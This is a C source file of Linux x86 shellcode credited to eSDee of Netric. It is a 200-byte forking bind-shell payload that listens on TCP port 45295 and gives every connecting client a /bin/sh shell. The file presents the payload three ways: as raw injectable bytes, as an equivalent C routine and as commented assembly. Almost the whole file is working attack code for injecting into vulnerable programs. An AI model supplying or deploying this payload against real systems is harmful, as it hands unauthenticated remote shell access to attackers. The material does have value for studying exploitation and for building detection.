/* linux x86 shellcode by eSDee of Netric (www.netric.org)
 * 200 byte - forking portbind shellcode - port=0xb0ef(45295)
 */     

#include <stdio.h>

char
main[] =
        "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
        "\x06\x51\xb1\x01\x51\xb1\x02\x51"
        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
        "\x89\xc1\x31\xc0\x31\xdb\x50\x50"
        "\x50\x66\x68\xb0\xef\xb3\x02\x66"
        "\x53\x89\xe2\xb3\x10\x53\xb3\x02"
        "\x52\x51\x89\xca\x89\xe1\xb0\x66"
        "\xcd\x80\x31\xdb\x39\xc3\x74\x05"
        "\x31\xc0\x40\xcd\x80\x31\xc0\x50"
        "\x52\x89\xe1\xb3\x04\xb0\x66\xcd"
        "\x80\x89\xd7\x31\xc0\x31\xdb\x31"
        "\xc9\xb3\x11\xb1\x01\xb0\x30\xcd"
        "\x80\x31\xc0\x31\xdb\x50\x50\x57"
        "\x89\xe1\xb3\x05\xb0\x66\xcd\x80"
        "\x89\xc6\x31\xc0\x31\xdb\xb0\x02"
        "\xcd\x80\x39\xc3\x75\x40\x31\xc0"
        "\x89\xfb\xb0\x06\xcd\x80\x31\xc0"
        "\x31\xc9\x89\xf3\xb0\x3f\xcd\x80"
        "\x31\xc0\x41\xb0\x3f\xcd\x80\x31"
        "\xc0\x41\xb0\x3f\xcd\x80\x31\xc0"
        "\x50\x68\x2f\x2f\x73\x68\x68\x2f"
        "\x62\x69\x6e\x89\xe3\x8b\x54\x24"
        "\x08\x50\x53\x89\xe1\xb0\x0b\xcd"
        "\x80\x31\xc0\x40\xcd\x80\x31\xc0"
        "\x89\xf3\xb0\x06\xcd\x80\xeb\x99";


int
c_code()
{
        char *argv[2];
        char *sockaddr =  "\x02\x00"             //  Address family
                          "\xb0\xef"             //  port
                          "\x00\x00\x00\x00"
                          "\x00\x00\x00\x00"
                          "\x00\x00\x00\x00";

        int sock        = 0;
        int new_sock    = 0;
        int a           = 16;

        sock = socket(2, 1, 6);
        if (bind(sock, sockaddr, 16) != 0) exit();
        listen(sock, 0);

        signal(17, 1);

        while(1) {

                new_sock = accept(sock, 0, 0);

                if (fork() == 0) {
                        close(sock);
                        dup2(new_sock, 0);
                        dup2(new_sock, 1);
                        dup2(new_sock, 2);
                        argv[0] = "//bin/sh";
                        argv[1] = NULL;
                        execve(argv[0], &argv[0], NULL);
                        exit();
                }

                close(new_sock);
        }

}


int
asm_code()
{
        __asm(" # sock = socket(2, 1, 6);
                xorl    %eax,   %eax
                xorl    %ebx,   %ebx
                xorl    %ecx,   %ecx
                pushl   %ecx
                movb    $6,     %cl             # IPPROTO_TCP
                pushl   %ecx
                movb    $1,     %cl             # SOCK_STREAM
                pushl   %ecx
                movb    $2,     %cl             # AF_INET
                pushl   %ecx
                movl    %esp,   %ecx
                movb    $1,     %bl             # SYS_SOCKET
                movb    $102,   %al             # SYS_socketcall
                int     $0x80           
                movl    %eax,   %ecx

                # if (bind(sock, sockaddr, 16) != 0) exit();
                xorl    %eax,   %eax
                xorl    %ebx,   %ebx
                pushl   %eax
                pushl   %eax
                pushl   %eax
                pushw   $0xefb0                 # port
                movb    $0x02,  %bl             # address family
                pushw   %bx
                movl    %esp,   %edx
                movb    $16,    %bl
                pushl   %ebx                    # 16
                movb    $2,     %bl             # SYS_BIND
                pushl   %edx
                pushl   %ecx                    # sock
                movl    %ecx,   %edx
                movl    %esp,   %ecx
                movb    $102,   %al             # SYS_socketcall
                int     $0x80
                xorl    %ebx,   %ebx
                cmpl    %eax,   %ebx
                je      SKIP_EXIT
                xorl    %eax,   %eax
                incl    %eax                    # SYS_exit
                int     $0x80 
                SKIP_EXIT:

                # listen(sock, 0);              
                xorl    %eax,   %eax
                pushl   %eax
                pushl   %edx                    # sock
                movl    %esp,   %ecx
                movb    $4,     %bl             # SYS_LISTEN
                movb    $102,   %al             # SYS_socketcall
                int     $0x80
                movl    %edx,   %edi

                xorl    %eax,   %eax
                xorl    %ebx,   %ebx
                xorl    %ecx,   %ecx
                movb    $17,    %bl             # SIGCHLD
                movb    $1,     %cl             # SIG_IGN
                movb    $48,    %al             # SYS_signal
                int     $0x80

                # while(1);
                WHILE:
                        # new_sock = accept(sock, 0, 0);
                        xorl    %eax,   %eax
                        xorl    %ebx,   %ebx
                        pushl   %eax
                        pushl   %eax
                        pushl   %edi                    # sock
                        movl    %esp,   %ecx
                        movb    $5,     %bl             # SYS_ACCEPT
                        movb    $102,   %al             # SYS_socketcall
                        int     $0x80
                        movl    %eax,   %esi            # new_sock

                        # if (fork() == 0) {

                        xorl    %eax,   %eax
                        xorl    %ebx,   %ebx
                        movb    $2,     %al             # SYS_fork
                        int     $0x80
                        cmpl    %eax,   %ebx
                        jne CLOSE_NEWSOCK

                                # close(sock);
                                xorl    %eax,   %eax
                                movl    %edi,   %ebx    # sock
                                movb    $6,     %al     # SYS_close
                                int $0x80

                                # dup2(new_sock, 0);
                                xorl    %eax,   %eax
                                xorl    %ecx,   %ecx    # stdin
                                movl    %esi,   %ebx    # new_sock
                                movb    $63,    %al     # SYS_dup2
                                int     $0x80

                                # dup2(new_sock, 1);
                                xorl    %eax,   %eax
                                incl    %ecx            # stdout
                                movb    $63,    %al     # SYS_dup2
                                int     $0x80

                                # dup2(new_sock, 3);
                                xorl    %eax,   %eax
                                incl    %ecx            # stderr
                                movb    $63,    %al     # SYS_dup2
                                int     $0x80

                                # execve(argv[0], &argv[0], NULL);
                                xorl    %eax,   %eax
                                pushl   %eax
                                pushl   $0x68732f2f
                                pushl   $0x6e69622f
                                movl    %esp,   %ebx    # //bin/sh
                                movl    8(%esp),%edx
                                pushl   %eax
                                pushl   %ebx
                                movl    %esp,   %ecx
                                movb    $0xb,   %al
                                int     $0x80           # SYS_execve

                                # exit()
                                xorl    %eax,   %eax
                                incl    %eax            # SYS_exit
                                int     $0x80
                        CLOSE_NEWSOCK:

                        # close(newsock);
                        xorl    %eax,   %eax
                        movl    %esi,   %ebx    # newsock
                        movb    $6,     %al     # SYS_close
                        int $0x80

                jmp WHILE ");


}